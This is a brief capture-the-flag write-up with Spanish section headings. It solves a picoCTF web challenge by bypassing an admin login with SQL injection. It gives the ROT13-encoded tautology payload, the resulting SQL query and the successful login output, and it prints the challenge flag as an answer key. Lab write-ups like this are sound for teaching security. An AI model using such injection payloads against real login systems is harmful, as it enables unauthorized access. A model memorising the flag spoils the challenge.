## Descripcion

There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!
## Pistas

Seems like the password is encrypted.

## Solucion

```
```
password: ' be 1 = 1 --
SQL query: SELECT * FROM admin where password = '' or 1 = 1 --'

Logged in!
```
```
![[3.png]]

## Bandera
picoCTF{3v3n_m0r3_SQL_06a9db19}

## Notas adicionales


## Referencias